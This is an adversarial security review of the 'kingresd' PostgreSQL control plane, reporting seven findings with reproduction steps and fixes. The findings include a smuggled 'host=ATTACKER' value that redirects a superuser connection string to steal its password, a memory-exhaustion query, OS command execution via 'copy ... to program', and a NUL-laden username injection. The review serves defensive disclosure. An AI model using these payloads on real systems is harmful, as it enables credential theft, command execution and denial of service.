<!-- SPDX-License-Identifier: AGPL-3.0-only -->
<!-- Copyright (c) 2026, RooyeKhat Media Co -->

# Security and correctness review of kingresd (control-plane)

Commit reviewed: `28f5360ec690e2a36a7cd8ad706c60cfd8c53dab`
(`git rev-parse HEAD` in the working tree at review start; the directories
`kingres/control-plane`, `kingres/api`, `kingres/docs` were exported with
`git archive HEAD ... | tar -x` into a scratch directory and reviewed there,
not in the live working tree).

Reviewer role: independent, adversarial. Not the author.

## Scope and method

Read in full: `kingres/control-plane/README.md`, `internal-api.md`,
`kingres/docs/design/control-plane-2.md` and `control-plane-3.md`,
`kingres/api/openapi.yaml`/`kingres/api/README.md` (contract, roles,
`x-required-role`), `kingres/docs/dev/coding-standards.md`. Read closely:
`internal/httpapi` (guard, middleware, forward, server, all handlers),
`internal/auth` (session, ratelimit, roles, postgres authenticator, scram),
`internal/sqlx`, `internal/setup`, `internal/instance` (render + manager),
`internal/cluster` (proxy, init, cluster, binaries), `internal/pki`,
`internal/internalapi`, `internal/peerclient`, `internal/ops` (ops, roles,
grants, network, settings, query, ledger, tables, databases),
`internal/audit`, `internal/serverinfo`, `internal/webui`,
`internal/contract`, `internal/config`, `cmd/kingresd`.

Ran: `go build` for the exported tree (Windows host) and a Linux build
(`GOOS=linux go build ./cmd/kingresd`) deployed into a copy of the WSL2
installation (`~/kw-review-cp`, ports 57750/57751, not the operator's
`~/kw-cp`). Drove a real one-server cluster through `init-cluster`,
`login`, role/grant/database/table/network/query-workbench endpoints with
`curl` and `psql`. Ran `go test -race -count=1 ./...` (all packages pass).
Ran targeted mutation tests: in a throwaway copy of the tree, disabled one
check at a time (CSRF, session role check, forwarded role check, setup
token verification, loopback-only gate, sqlx identifier/literal quote
doubling, bearer/cookie kind check, internal-API `LeaderOnly` check, CA
revocation check, cross-site check, forwarded-identity validation, HBA
name character filter, login-without-cluster-role refusal, `Allows` with
an unknown role) and confirmed the existing test suite fails for every one
of them — see "Examined and found sound" below for the full list and
exact mutations. Everything else started and run in WSL was removed
afterward (`pkill`, `pg_ctl ... stop`, `rm -rf ~/kw-review-cp/run1`, temp
token/exploit files).

## Findings

### CP-01 — Critical: path-parameter injection into the service-role DSN discloses the superuser database credential to any `kingres_readonly` user

**File/lines:** `internal/cluster/cluster.go:135-142` (`ServiceDSN`), called
from `connect` at `internal/cluster/cluster.go:248-260`, called from
`ServiceConn`/`asService` (`internal/ops/ops.go:117-130`) from every
operation that uses the service connection with the `databaseName` path
parameter as `db`, e.g. `listLedgerDigests`, `generateLedgerDigest`,
`startLedgerVerification` (`internal/httpapi/handlers_ops.go`,
`internal/ops/ledger.go`).

**What is wrong:** `ServiceDSN` builds the libpq connection string with
`fmt.Sprintf("host=127.0.0.1 port=%d dbname=%s user=%s password=%s sslmode=%s", ..., db, ...)`.
`db` is not quoted or restricted to a libpq-safe token; it is only checked,
upstream, by `pathName` (`internal/httpapi/query.go:165`, length 1–63) and
by `sqlx.NewIdent` (`internal/sqlx/sqlx.go:40`, which rejects only control
characters, not spaces or `=`). A `databaseName` value such as
`x host=ATTACKER port=NNNN` therefore survives both checks and, once
substituted into the `dbname=%s` slot of the DSN, is parsed by libpq's
keyword/value grammar as **additional, overriding** `host` and `port`
keywords (later occurrences of a repeated keyword win in a libpq
connection string). The service role (`kingresd`, created with
`SUPERUSER` by `initdb --pwfile`) then connects to the attacker's
listener and sends its password in cleartext in response to whatever
`AuthenticationCleartextPassword` request the rogue listener chooses to
send — `pgx` has no opinion about which auth method the server asks for.

This is reachable by `kingres_readonly`, the second-lowest cluster role
(`listLedgerDigests` has `x-required-role: kingres_readonly`), i.e. by the
least-privileged account that can sign in and run any mutating/listing
operation at all.

**Exact steps (reproduced):**
1. Sign in as any role with `kingres_readonly` (e.g. a role created by an
   admin with `clusterRoles: ["kingres_readonly"]`); obtain a bearer token.
2. Start a bare TCP listener on an attacker-controlled host/port that
   speaks just enough of the PostgreSQL startup protocol to request
   `AuthenticationCleartextPassword` and read the response.
3. `GET /api/v1/databases/<X>/ledger/digests` where `<X>` is a value whose
   first libpq token is an arbitrary existing-looking name followed by
   `" host=<attacker> port=<attacker-port>"` (URL-encoded in the path).
4. The service role (`kingresd`, a PostgreSQL superuser) connects to the
   attacker's listener instead of the real instance and sends its
   password in the clear.

**Observed:** the listener received a startup packet with `user=kingresd`
and captured a password whose SHA-256 matched (confirmed byte-for-byte via
hash comparison) the real service-role password stored at
`<data-dir>/service-credentials` on the server under test. The caller's
session needed only `kingres_readonly`.

**Impact:** full disclosure of the local PostgreSQL superuser's password
to the lowest role that can sign in at all, from which an attacker with
this password and plain network access to the real PostgreSQL port (which
`pg_hba.conf` already allows for `scram-sha-256` from the configured
network ranges) obtains superuser SQL access to the whole instance —
every database, every table, `COPY ... TO/FROM PROGRAM`, extension
installation, etc. It also demonstrates that any `databaseName` value can
redirect a "local service connection" to an arbitrary attacker host, which
is independently a strong SSRF primitive against the control-plane
process's local network position.

**Fix:** never build a DSN with `fmt.Sprintf` from untrusted input. Either
set `cfg.Database` on the already-parsed `pgx.ConnConfig` struct field (as
`cluster.Proxy.Connect` correctly does) instead of composing a DSN string,
or validate `db` with the same identifier grammar used for a *bare*
PostgreSQL identifier (no whitespace, no `=`, no further libpq keyword
syntax) before letting it anywhere near a DSN string. This also means
`sqlx.NewIdent`'s character set (which is deliberately “anything but
control characters”, documented as designed for `"..."`-quoted SQL
identifiers) is unsafe to reuse as a validator for values that will be
spliced into a key=value connection string rather than quoted SQL —
the two uses need separate validators.

---

### CP-02 — Critical: a session's cluster roles are cached at sign-in and never revalidated; demoting, disabling or dropping a role does not revoke its existing sessions or tokens

**Files/lines:** `internal/auth/session.go` (`Session.ClusterRoles` set
once in `Store.Create`, never updated); `internal/httpapi/guard.go`
(`checkSession` calls `auth.Allows(sess.ClusterRoles, c.op.Role)` — purely
in-memory, no re-check against PostgreSQL); `internal/ops/roles.go` —
`SetClusterRoles` (line ~417) and `SetMemberships` (line ~368) run on the
**service** connection (`o.asService`) and call `o.Roles.Revoke` **never**;
only `DeleteRole` (line ~281) and `UpdateRole` when disabling login (line
~313) call `o.Roles.Revoke`, and `Revoke` only removes the
`pg_ident.conf` proxy mapping — it does not touch `auth.Store`.

**What is wrong:** the only authorization check for an admin-only endpoint
such as `setRoleClusterRoles`, `listRoles`, `listAuditEvents`,
`createRole`, etc. is `auth.Allows(sess.ClusterRoles, ...)`, where
`sess.ClusterRoles` was captured once at `login` time and is never
refreshed. Removing a role from `kingres_admin` (`SetClusterRoles`) or
disabling/dropping it neither revokes the role's live sessions/tokens nor
downgrades the cached roles in them. Because `SetClusterRoles` itself runs
through the **service** role rather than the actor's own PostgreSQL
connection, there is also no secondary, PostgreSQL-level permission check
that could have caught this at the database layer the way `roleExecutor`
does for ordinary role changes.

**Exact steps (reproduced):**
1. As `root_admin` (`kingres_admin`), create role `carol` with
   `clusterRoles: ["kingres_admin"]`.
2. Sign in as `carol`, obtain bearer token `CT`.
3. As `root_admin`, demote carol: `PUT /roles/carol/cluster-roles` with
   `{"clusterRoles": []}`. The role-level change is applied (confirmed via
   `GET /roles/carol`: `"clusterRoles": []`).
4. Using the *same, un-refreshed* token `CT`, `carol` calls
   `PUT /roles/carol/cluster-roles` with `{"clusterRoles": ["kingres_admin"]}`
   again. **This succeeds** (200, body shows `"clusterRoles":["kingres_admin"]`)
   — a demoted administrator re-grants herself administrator with the very
   token that was just demoted.
5. With the same stale token, `carol` then calls
   `PATCH /roles/root_admin` with a new password; this succeeds and changes
   the real administrator's password. (Reversed immediately in the test;
   logging back in with the old password then correctly fails with 401,
   confirming the change was real.)
6. The same pattern was reproduced with role `bob`: after `root_admin`
   demotes `bob` to no cluster role, `bob`'s already-issued bearer token
   still returns 200 from `GET /roles` (an admin-only listing) using only
   the stale cached session.

**Impact:** an administrator who is demoted, disabled or has a dropped
account because they were compromised, fired, or made a mistake retains
full use of every privilege their session cached at sign-in — including
the ability to grant themselves back the privilege that was just removed
— for up to `session-ttl` (default 8 hours, operator-configurable upward,
10000 sessions kept in memory with no forced expiry shorter than the
absolute TTL) or until the server restarts. This defeats the entire
purpose of `setRoleClusterRoles`, `updateRole` (disabling login) and
`deleteRole` as an incident-response mechanism, and is explicitly one of
the review's named scenarios ("what happens to a session when the role is
dropped, disabled, loses its cluster role or changes password").

**Fix:** either (a) make session role membership a live check (look the
role's current cluster roles up on every request, at least for mutating
and admin-tag operations, with a short cache), or (b) maintain a
monotonic per-role "generation"/revocation list bumped by
`SetClusterRoles`/`UpdateRole`/`DeleteRole`/`SetMemberships` that
`checkSession` consults before trusting `sess.ClusterRoles`, or (c) at
minimum, revoke (or re-derive) all live sessions of a role whenever its
cluster roles, login ability, or password change, the way `Revoke` already
does for the PostgreSQL proxy mapping. Any of these should also apply to
`SetMemberships`, which has the same gap (never calls `Revoke`).

---

### CP-03 — High: PostgreSQL's own error log records the full text of a failed query-workbench statement, including any literal secret it contains, and `GET /logs` (role `kingres_readonly`) exposes it to users below the level that ran it

**Files/lines:** `internal/ops/query.go` (`ExecuteQuery` deliberately
avoids logging statement text itself, consistent with the design note that
"the workbench records that a statement ran, its length and a hash, not
its text" — see `control-plane-2.md`, Security requirements); but
PostgreSQL's own server log is written independently of kingresd
(`log_min_error_statement`, PostgreSQL's default), and
`internal/serverinfo/serverinfo.go` (`ReadLogs`) parses and returns that
log's lines verbatim; `internal/httpapi/handlers_server.go` (`listLogs`,
`listThisServerLogs`) serves it at `x-required-role: kingres_readonly`.

**What is wrong:** a statement run through the query workbench that fails
(e.g. a typo in a `CREATE ROLE ... PASSWORD '...'` statement, or any other
DDL with an embedded secret that PostgreSQL rejects) is written by
PostgreSQL itself into `postgresql-*.log` with its full text, by design of
`log_min_error_statement`. `kingresd`'s `/logs` and
`/this-server/logs` endpoints read and return that file's content to
*any* signed-in role at `kingres_readonly` or above — a role several
levels below the role that ran the workbench statement.

**Exact steps (reproduced):**
1. As a `kingres_readonly` role `dev1`, run via `POST /query`:
   `create user zz password 'S3cr3t-In-Workbench' nosuchoption` against a
   database (chosen to fail with an "unrecognized role option" error, so
   PostgreSQL logs the statement).
2. As a *different*, independently-created `kingres_readonly` role
   `reader1`, call `GET /logs?limit=20`.
3. The returned log entries include, verbatim:
   `"message":"create user zz password 'S3cr3t-In-Workbench' nosuchoption"`.

**Impact:** any secret value appearing in a workbench statement that
PostgreSQL logs on error (passwords in `CREATE ROLE`/`ALTER ROLE`, literal
values in failing `INSERT`s that PostgreSQL echoes, etc.) is visible,
without further privilege, to every other signed-in `kingres_readonly`+
account via a documented, non-"not supported yet" endpoint. This directly
contradicts the design's explicit security promise that "passwords, tokens
and query text of the workbench are never written to ... the logs" — the
promise holds for kingresd's own logs and audit file, but not for the
underlying PostgreSQL log that kingresd itself re-exposes over the API.

**Fix:** either suppress `log_min_error_statement`/avoid logging statement
text for connections made through the proxy (not generally possible
per-connection in PostgreSQL without `log_statement`/`log_min_error_statement`
being a global GUC), or redact/filter the application-visible log stream
before serving it (at least strip anything that looks like a `PASSWORD`
clause), or require a role at least as privileged as the one that produced
the log line, or do not route PostgreSQL's own log through `GET /logs`
without such a safeguard.

---

### CP-04 — High: the query workbench has no byte-size cap on a result, only a row-count cap, allowing a `kingres_readonly` session to force a multi-GB memory spike with one statement

**Files/lines:** `internal/ops/query.go:33-129` (`ExecuteQuery`): `limit`
(`rowLimit`, 1–10000, default 1000) bounds the number of *rows* buffered,
but no bound exists on the byte size of a row or of the whole buffered
result before it is marshaled to JSON and written to the response.

**Exact steps (reproduced):** as a `kingres_readonly` role, call
`POST /query` with
`{"database": "...", "sql": "select repeat('x', 60000000) from generate_series(1,10)", "rowLimit": 10}`.

**Observed:** the request returned 200 with a ~600 MB JSON body
(`size_download=600000183`), and `kingresd`'s own process `VmHWM` jumped
from ~20 MB to **~3.3 GB** for that one request (captured via
`/proc/<pid>/status` on the process under test, before and after).

**Impact:** a single statement from the lowest role that can reach the
workbench (`kingres_readonly`, per the contract's `x-required-role` on
`executeQuery`) can push the control-plane process's resident memory up by
several GB, which on a modestly provisioned node is enough to trigger the
OOM killer or starve PostgreSQL and every other request kingresd serves —
a low-privilege, single-request denial of service.

**Fix:** bound the serialized size of the buffered result (not just the
row count) and abort/truncate the statement once a byte budget is
exceeded, the same way the row-count truncation already cancels the
connection (`cancel()` call already present in `ExecuteQuery`). The
`internalapi` `exec` call has a similar unbounded-row-value risk and
should get the same treatment (it currently only caps row *count*, not
row byte size, in `cmd/kingresd/internal.go`'s `execLocal`).

---

### CP-05 — Medium: `kingres_admin` can grant any role membership in dangerous predefined PostgreSQL roles with no restriction, and such a role can then run arbitrary OS commands from the query workbench

**Files/lines:** `internal/ops/roles.go` (`SetMemberships`, ~line 350):
validates only that the target name is a syntactically valid identifier
and is not itself a cluster role; it does not exclude PostgreSQL's
predefined roles (`pg_execute_server_program`, `pg_read_server_files`,
`pg_write_server_files`, `pg_read_server_logs`, etc.).

**Exact steps (reproduced):**
1. As `root_admin`, `PUT /roles/carol/memberships` with
   `{"memberOf": ["pg_execute_server_program", "pg_read_server_files"]}`.
2. As `carol`, `POST /query` with
   `{"database": "...", "sql": "copy (select 1) to program 'id > /tmp/...'"}`.
3. The command ran as the PostgreSQL server process's operating-system
   user and its output landed in the named file — confirmed by reading it
   back.

**Impact:** this is reachable only by `kingres_admin` (the highest cluster
role), and `kingres_admin` already has very broad power (role/grant/DB/
table management, and the ability to run SQL as any other role for which
it is the administrator). It is listed here because the review explicitly
calls out this exact escalation path (predefined roles such as
`pg_execute_server_program`/`pg_write_server_files`) as something to
check, and because `SetMemberships` is otherwise careful (it refuses
cluster-role names and self-membership) but makes no exception for these
specific names, unlike the deliberate carve-outs elsewhere in the same
file (e.g. the cluster-role exclusion). Treat as a defense-in-depth gap
rather than a privilege boundary that is actually crossed, since the
granting party is already maximally privileged.

**Fix:** if the intent is that `kingres_admin` should not be able to hand
out OS-command-execution-equivalent membership to *other* roles (as
distinct from what `kingres_admin` can already do to the instance
itself), add `pg_execute_server_program`, `pg_read_server_files`,
`pg_write_server_files` and `pg_read_server_logs` to the blocked-name set
in `SetMemberships` (and `CreateRole`'s `memberOf` validation, which has
the identical gap).

---

### CP-06 — Low: raw, unsanitized attacker-controlled usernames (including embedded NUL and control characters) are written verbatim into the audit log's `actor`/`resourceId` fields

**Files/lines:** `internal/httpapi/handlers_core.go` (`login`): `ev.Actor,
ev.ResourceID = req.Username, req.Username` before any character
validation beyond length (1–63) is applied; `internal/audit/audit.go`
writes `Event.Actor`/`ResourceID` into JSON lines unescaped beyond Go's
`encoding/json` string escaping.

**Observed (reproduced):** submitting a login with a username containing
embedded `\u0000` and arbitrary text produced an audit line whose `actor`
and `resourceId` fields contained the literal attacker string
(`"actor":"root_admin\u0000options\u0000-c application_name=injected_by_username"`).
JSON encoding neutralizes this for any JSON-aware consumer, and the
PostgreSQL driver itself refused the NUL-containing username before any
SQL reached PostgreSQL, so this is not SQL injection and not shown to be
exploitable further — it is recorded here as a correctness/robustness
observation: operators or tools that process the audit file as line-based
text (`grep`, naive log shippers) rather than as JSON could be confused by
control characters embedded in a field that is nominally "a role name".

**Fix:** validate/normalize the username the same way `roleNameRE` would
before using it as an audit actor, or explicitly document that `actor`
may contain NUL/control characters and audit consumers must treat the
file as JSON Lines, never as plain text.

---

### CP-07 — Medium, reasoned (not reproduced): the manager leader fully trusts a forwarding peer's claimed `username`/`clusterRoles` with no secondary check against a live session anywhere

**Files/lines:** `internal/httpapi/forward.go` (`ServeForwarded`,
`validateIdentity`): the only checks are that `Identity.Username` is a
non-empty, NUL-free string ≤63 bytes and that `Identity.ClusterRoles`
names are among the four known cluster-role strings. There is no check
that this identity corresponds to any actual, currently-valid session
anywhere in the cluster, and no signature or nonce ties the forwarded
identity to the original authentication event.

**Reasoning (not reproduced — would require a multi-node mTLS cluster,
which this review did not stand up):** the internal API's trust model is
"every peer with a cluster-CA-signed client certificate is a fully
trusted cluster member" (`internal/internalapi/internalapi.go`, policy
`ToLeader`: "any peer may call"). That is a deliberate architectural
choice (`control-plane-3.md`, D6/D2) and not a bug by itself. But it does
mean that compromise of **any single** cluster member's internal-API
credentials is equivalent to full `kingres_admin` control of the entire
cluster through forwarding — the compromised peer can forward any
mutating operation with `Identity.Username` set to the real administrator
's name and `ClusterRoles: ["kingres_admin"]`, and the leader has no way
to tell this apart from a forward of a real, freshly authenticated
request from that peer. There is no re-verification against the
forwarding peer's own session store, no requirement that the forwarded
request be recent, and no record on the leader distinguishing "this peer
told us who signed in" from "this peer is lying" beyond the peer's mTLS
identity itself.

**Suggested hardening (not verified in this review):** consider binding
the forwarded identity to something the leader can check independently —
for example a short-lived, leader-countersigned proof issued at the
forwarding server's own login time — or at least make this trust
assumption explicit in `internal-api.md` if it is not already (so that
operators understand that compromising one cluster node's internal-API
key compromises cluster-wide `kingres_admin`, not just that one node).

## Examined and found sound

The following were read closely and, in addition, verified by mutation
testing in a disposable copy of the tree (disable the check, confirm the
existing test suite catches it):

- **CSRF protection** on cookie-session mutating requests
  (`internal/httpapi/guard.go`, `checkSession`) — disabling it fails
  `TestCSRFAndSessionLifecycle`.
- **Cross-site (`Sec-Fetch-Site: cross-site`) rejection** on every
  mutating request (`guard.go`) — disabling it fails the same test.
- **Role enforcement derived from the contract** for both the direct
  session path and the forwarded-identity path
  (`auth.Allows(sess.ClusterRoles, c.op.Role)` called twice in
  `checkSession`) — disabling either call independently fails
  `TestRoleMatrix`, `TestForwardingKeepsTheCallersAuthorization`,
  `TestAuditOfMutatingRequests`, `TestResponsesValidateAgainstContract`,
  `TestNotImplementedIsUniform`, or
  `TestLeaderChecksTheForwardedIdentityAgain` respectively.
- **Setup-token verification and consumption** (`setup.Manager.VerifyToken`,
  constant-time compare, one-time, state-gated) — forcing it to always
  succeed fails `TestSetupTokenChecks`, `TestCheckSetupToken`,
  `TestSetupTokenAttemptsAreRateLimited`.
- **Localhost-only gating of setup while uninitialized**
  (`s.deps.LoopbackOnly && !isLoopback(c.ip)`) — removing it fails
  `TestLocalhostOnlyBlocksRemoteSetupCalls`.
- **Bearer-token vs. cookie-session kind separation** (`sess.Kind != want`
  in `authenticate`) — a cookie value presented as a bearer token (or
  vice versa) is refused; relaxing the check fails
  `TestCredentialKindsAreNotInterchangeable`.
- **`sqlx` identifier quoting (doubling embedded `"`)** and **literal
  quoting (doubling embedded `'`)** — removing either doubling step fails
  `TestNewIdent`/`TestBuilder`/`FuzzIdentQuoting` or
  `TestQuoteLiteral`/`TestBuilder`/`FuzzLiteralQuoting` respectively; also
  fuzzed both by hand with control characters, embedded quotes, and
  Unicode line/paragraph separators with no crash or unescaped output
  found beyond the known DSN-injection gap in CP-01 (which is a different
  code path that does not go through `sqlx` at all).
- **`pg_hba.conf`/`pg_ident.conf` name rendering** (`internal/instance/render.go`,
  `hbaName`, `RenderIdent`) refuses names containing `,`, `"`, `#`, `\`,
  control characters, or the reserved `all`/`kingresd` tokens — removing
  the character filter or the `all`/service-role exclusion fails
  `TestRenderHBARefusals` immediately (comma/quote/hash all become
  "accepted" once the filter is removed, which would let a role name
  inject an extra `pg_hba.conf`/`pg_ident.conf` rule or a comment).
- **Internal API `LeaderOnly` authorization**
  (`internal/internalapi/internalapi.go`, `ServeHTTP`) — removing the
  "caller must be the known leader" check for `GET /resources`,
  `GET /logs`, `GET /metrics`, `POST /exec` fails `TestAuthorizationTable`
  (a non-leader peer's calls, which must be refused, instead return 200
  and `exec` runs twice instead of once).
- **CA certificate revocation enforcement** (`internal/pki/pki.go`,
  `CA.VerifyPeer`) — removing the `IsRevoked` check fails `TestRevocation`
  and `TestCertificateAndVersionRefusals`.
- **Forwarded-identity validation** (`internal/httpapi/forward.go`,
  `validateIdentity`) — removing either the username check or the
  cluster-role-name check fails `TestLeaderChecksTheForwardedIdentityAgain`
  (an empty username or an unknown role name is then "accepted").
- **Refusal to log in with no cluster role** (`handlers_core.go`, `login`)
  — removing the `len(roles) == 0` refusal fails `TestLoginFailures` and
  `TestAuditOfAuthenticationEvents`.
- **`auth.Allows` fails closed for an unknown required role** — forcing
  it to default to `true` fails `TestHierarchyAllows`.
- **Role-membership walk** explicitly avoids `pg_has_role` (which answers
  true for every role when the caller is a superuser) and walks
  `pg_auth_members` with `inherit_option` honored
  (`internal/auth/postgres.go`, `memberSQL`); confirmed by reading the
  code and its comment, and by observing in the live cluster that the
  superuser service role `kingresd` is *not* reported as a member of any
  cluster role.
- **Setup token file handling**: generated with 24 random bytes
  hex-encoded, written atomically with `O_EXCL`-created temp file + fsync
  + rename, compared in constant time, removed on the uninitialized →
  non-uninitialized transition, and a stale token file from an earlier
  run is discarded if too short. Read closely; no defect found.
- **Login rate limiting**: a per-address limiter and a per-username
  limiter apply independently and only a successful login resets the
  *username* counter, not the address history (reproduced: 10 failed
  attempts from one simulated source address against `root_admin`
  correctly rate-limited a subsequent *correct*-password attempt from a
  different simulated source address attempting the same username, while
  a different username from that second address succeeded — i.e. the
  per-username limiter, not an address-based lockout bypass, is what
  blocked it, which is the documented, intended behavior).
- **Instance manager marker-file check, path handling, atomic
  `pg_hba.conf`/`kingres-managed.conf`/`pg_ident.conf` writes, `run` as
  non-root refusal**: read in full; `validateConfPath` rejects `..`
  segments, non-absolute paths and control characters; writes go through
  `writeAtomic` (temp file + rename in the same directory).
- **`go test -race -count=1 ./...`**: all packages pass with no data race
  reported.

## Not examined

- Multi-server cluster behavior (failover, rebalance, replication
  topology, `addServer`/`removeServer`) — these are documented as "not
  supported yet" in this increment and were not probed beyond confirming
  they answer the uniform `unsupported_operation` problem after
  authentication/authorization/CSRF have already run (per
  `notImplemented` in `guard.go`, which is itself covered by the mutation
  tests above since it runs through the same guard).
- The internal API's `/forward` path end-to-end across two real,
  mutually-authenticated `kingresd` processes (CP-07 is reasoned from code
  only; standing up a second node with its own PKI-issued certificate was
  out of scope for the time available).
- The task engine's lease/takeover logic and crash-between-step-and-record
  behavior under actual process kills (only read; not fault-injected).
- `internal/pki` CRL distribution end-to-end (CRL generation code was read
  and the revocation check was mutation-tested, but no client was observed
  consuming a served `ssl_crl_file` against a live PostgreSQL TLS
  listener).
- Fuzzing of `internal/instance`'s `RenderManaged`/`validateConfPath`
  beyond the existing unit tests and the manual adversarial inputs listed
  above.
- The web panel's own JavaScript/CSP behavior beyond the static headers
  set in `securityHeaders` (`httpapi/middleware.go`) and the SPA-fallback
  routing in `internal/webui`.
- `metrics-token` constant-time comparison timing beyond code reading
  (`subtle.ConstantTimeCompare` is used, which is correct by inspection).
